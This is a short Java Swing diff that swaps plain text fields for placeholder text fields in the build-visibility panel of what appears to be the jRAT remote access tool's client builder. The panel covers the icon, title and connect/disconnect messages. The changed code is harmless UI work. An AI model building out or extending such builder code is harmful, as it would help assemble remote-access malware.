@@ -22,6 +22,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import se.jrat.client.Constants;
 import se.jrat.client.ErrorDialog;
 import se.jrat.client.Main;
+import se.jrat.client.ui.components.JPlaceholderTextField;
 import se.jrat.client.utils.IconUtils;
 
 
@@ -78,9 +79,8 @@ public class PanelBuildVisibility extends JPanel {
 
 		JLabel lblIcon = new JLabel("Icon:");
 
-		txtIcon = new JTextField();
+		txtIcon = new JPlaceholderTextField("default");
 		txtIcon.setEditable(false);
-		txtIcon.setText("default");
 		txtIcon.setColumns(10);
 
 		JButton button = new JButton("");
@@ -118,8 +118,7 @@ public class PanelBuildVisibility extends JPanel {
 
 		JLabel lblMessages = new JLabel("Messages:");
 
-		txtConnect = new JTextField();
-		txtConnect.setText("You are now connected!");
+		txtConnect = new JPlaceholderTextField("You are now connected!");
 		txtConnect.setColumns(10);
 		panel_1.setLayout(new BorderLayout(0, 0));
 
@@ -127,12 +126,10 @@ public class PanelBuildVisibility extends JPanel {
 		panelImage.image = IconUtils.getIcon("icon").getImage();
 		panel_1.add(panelImage, BorderLayout.CENTER);
 
-		txtDisconnect = new JTextField();
-		txtDisconnect.setText("You are now disconnected!");
+		txtDisconnect = new JPlaceholderTextField("You are now disconnected!");
 		txtDisconnect.setColumns(10);
 
-		txtTitle = new JTextField();
-		txtTitle.setText(Constants.NAME + "");
+		txtTitle = new JPlaceholderTextField(Constants.NAME);
 		txtTitle.setColumns(10);
 
 		JLabel lblConnect = new JLabel("Connect:");
